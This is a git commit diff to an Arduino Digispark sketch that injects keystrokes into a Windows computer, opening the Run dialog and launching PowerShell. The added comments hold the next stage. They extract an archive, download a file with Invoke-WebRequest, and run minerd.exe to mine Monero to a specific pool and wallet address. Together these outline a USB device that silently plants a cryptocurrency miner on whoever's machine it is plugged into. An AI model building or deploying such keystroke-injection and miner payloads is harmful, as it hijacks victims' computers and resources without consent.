49f85eecda63f3ce2859c6ac73f068dd4b7c7858
cvasqxz <cvxz@pm.me>
2020-01-15 23:41:06 -0300

    comentarios de comandos locos

--- keyboard/keyboard.ino
+++ keyboard/keyboard.ino
@@ -3,11 +3,9 @@
 int LED_PIN = 1;
 int KEY_DELAY = 1000;
 
-
 void setup() {
   pinMode(LED_PIN, OUTPUT);
 }
-
 
 void loop() {
   digitalWrite(LED_PIN, HIGH);
@@ -15,14 +13,10 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(KEY_DELAY);
   
-  // Minimizar todo
-  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);
-  DigiKeyboard.delay(KEY_DELAY);
-
   // Ejecutar CMD
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(KEY_DELAY);
-  DigiKeyboard.print("cmd");
+  DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(KEY_DELAY);
 
@@ -35,5 +29,10 @@ void loop() {
 
   digitalWrite(LED_PIN, LOW);
 
-  for(;;){ /*empty*/ }
+  for(;;){ }
+
+  // Expand-Archive -Force C:\path\to\archive.zip C:\where\to\extract\to
+  // Invoke-WebRequest https://github.com/hsgw/plaid/blob/master/doc/img/plaid.jpg -O plaid.jpg
+  // .\minerd.exe -a cryptonight -u 458pdQ1HHaVeqx8kY9KktsTiwaeHgN1az6eJ96fadvHw3jwbK3cevM7egz4NctbVUmCKWF1HnqRwJfzqDbeqT8ev7PMTiAJ -p demonio -o stratum+tcp://pool.supportxmr.com:3333
+  
 }
